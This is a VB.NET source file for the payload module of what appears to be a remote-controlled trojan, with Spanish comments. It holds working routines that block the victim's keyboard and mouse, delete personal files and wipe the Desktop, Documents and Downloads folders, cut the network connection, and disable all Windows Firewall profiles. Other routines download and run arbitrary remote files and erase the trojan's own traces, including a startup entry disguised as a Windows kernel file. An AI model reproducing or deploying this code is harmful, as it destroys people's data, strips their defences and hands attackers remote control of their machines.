Public Class Payloads
    Dim Assembly As String = Application.StartupPath & "\" & My.Application.Info.AssemblyName & ".exe"
    Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean

    Private Sub Payloads_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Sub ActivateAllPayloads()
        BorrarCosillas()
        DesconectarConexion()
        Inputs(True)
        WindowsFirewall(False)
        TCPCMDReader.DiagnosticPosting("Activadas todas las Payloads", "TCP.DGN.Payloads", True, False)
    End Sub

#Region "Payloads" 'Con tiempo irea creciendo...
    Sub Inputs(ByVal Status As Boolean)
        On Error Resume Next
        BlockInput(Status)
        TCPCMDReader.DiagnosticPosting("Bloqueo de entradas (Mouse & Keyboard) (" & Status & ")", "TCP.DGN.Payloads", True, False)
    End Sub

    Sub Unistall(ByVal Timeout As Integer) 'NEW! 11/06/2020 (Timeout = 2sec or 2000)
        Try
            Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
            'ELIMINA DE TODAS PARTES EN DONDE HAYA ALGUN FICHERO CREADO POR Equisde.exe, incluyendolo.
            Dim ArgumentContent As String = "/C ping 1.1.1.1 -n 1 -w " &
                Timeout.ToString &
                " > Nul & Del " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote & 'Elimina el ejecutable
                " & rd " & Starter.DIRCommons & " /S /Q " &  'Elimina la carpeta en donde se encuentran ficheros del ejecutable
                " & Del " & ControlChars.Quote & "C:\Users\" + Environment.UserName + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsKernelBootstrap.exe" & ControlChars.Quote 'Elimina el "iniciador" con windows de la carpeta Inicio
            'p.Arguments = "/C ping 1.1.1.1 -n 1 -w " & Timeout.ToString & " > Nul & Del " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote & " & Del " & ControlChars.Quote & "C:\Documents and Settings\" + Environment.UserName + "\Start Menu\Programs\Startup\WindowsKernelBootstrap.exe" & ControlChars.Quote & " & del " & ControlChars.Quote & "C:\Users\" + Environment.UserName + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsKernelBootstrap.exe" & ControlChars.Quote ORIGINAL
            p.Arguments = ArgumentContent
            p.CreateNoWindow = True
            p.ErrorDialog = False
            p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
            System.Diagnostics.Process.Start(p)
            End
        Catch ex As Exception
            Console.WriteLine("[Payloads@Unistall]Error: " & ex.Message)
        End Try
    End Sub

    Sub BorrarCosillas()
        On Error Resume Next
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.exe")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.txt")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.docs")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.rar")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.zip")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.pdf")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.png")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.jpg")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.mp3")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.mp4")
        Kill("C:\Users\" & Environment.UserName & "\Documents\*.avi")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.exe")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.txt")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.docs")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.rar")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.zip")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.pdf")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.png")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.jpg")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.mp3")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.mp4")
        Kill("C:\Users\" & Environment.UserName & "\Desktop\*.avi")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.exe")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.txt")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.docs")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.rar")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.zip")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.pdf")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.png")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.jpg")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.mp3")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.mp4")
        Kill("C:\Users\" & Environment.UserName & "\Downloads\*.avi")
        My.Computer.FileSystem.DeleteDirectory("C:\Users\" & Environment.UserName & "\Desktop", FileIO.DeleteDirectoryOption.DeleteAllContents)
        My.Computer.FileSystem.DeleteDirectory("C:\Users\" & Environment.UserName & "\Downloads", FileIO.DeleteDirectoryOption.DeleteAllContents)
        My.Computer.FileSystem.DeleteDirectory("C:\Users\" & Environment.UserName & "\Documents", FileIO.DeleteDirectoryOption.DeleteAllContents)
        TCPCMDReader.DiagnosticPosting("Items borrados", "TCP.DGN.Payloads", True, False)
    End Sub

    Sub DesconectarConexion()
        On Error Resume Next
        My.Computer.FileSystem.WriteAllText(Starter.DIRCommons & "\RLSCNT.bat", "ipconfig /release", False)
        Process.Start(Starter.DIRCommons & "\RLSCNT.bat")
        TCPCMDReader.DiagnosticPosting("Conexion desconectada (" & Starter.DIRCommons & "\RLSCNT.bat" & ")", "TCP.DGN.Payloads", True, False)
    End Sub

    Sub DownloadSomething(ByVal URL As String, ByVal Name As String, ByVal RUN As Boolean, ByVal Arguments As String)
        Try
            My.Computer.Network.DownloadFile(URL, Starter.DIRCommons & Name)
            Threading.Thread.Sleep(50)
            If RUN = True Then
                If Arguments = "None" Then
                    Process.Start(Starter.DIRCommons & "\" & Name)
                Else
                    Process.Start(Starter.DIRCommons & "\" & Name, Arguments)
                End If
            End If
            TCPCMDReader.DiagnosticPosting("Se descargo algo: (URL:" & URL & " >Nombre:" & Name & " >Ejecutar:" & RUN & " >Argumento:" & Arguments & ")", "TCP.DGN.Payloads", True, False)
        Catch ex As Exception
            Console.WriteLine("[Payloads@DownloadSomething]Error: " & ex.Message)
        End Try
    End Sub

    Sub WindowsFirewall(ByVal Status As Boolean)
        If Status = False Then
            Try
                Const NET_FW_PROFILE2_DOMAIN = 1
                Const NET_FW_PROFILE2_PRIVATE = 2
                Const NET_FW_PROFILE2_PUBLIC = 4
                Dim fwPolicy2
                fwPolicy2 = CreateObject("HNetCfg.FwPolicy2")
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_DOMAIN) = False
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_PRIVATE) = False
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_PUBLIC) = False
                Console.WriteLine("FIREWALL DESACTIVADO")
                TCPCMDReader.DiagnosticPosting("Firewall desactivado", "TCP.DGN.Payloads", True, False)
            Catch ex As Exception
                Console.WriteLine("[Payloads@WindowsFirewall(Desactivate)]Error: " & ex.Message)
            End Try
        ElseIf Status = True Then
            Try
                Const NET_FW_PROFILE2_DOMAIN = 1
                Const NET_FW_PROFILE2_PRIVATE = 2
                Const NET_FW_PROFILE2_PUBLIC = 4
                Dim fwPolicy2
                fwPolicy2 = CreateObject("HNetCfg.FwPolicy2")
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_DOMAIN) = True
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_PRIVATE) = True
                fwPolicy2.FirewallEnabled(NET_FW_PROFILE2_PUBLIC) = True
                Console.WriteLine("FIREWALL RE-ACTIVADO")
                TCPCMDReader.DiagnosticPosting("Firewall Activado", "TCP.DGN.Payloads", True, False)
            Catch ex As Exception
                Console.WriteLine("[Payloads@WindowsFirewall(Activate)]Error: " & ex.Message)
            End Try
        End If
    End Sub
#End Region
End Class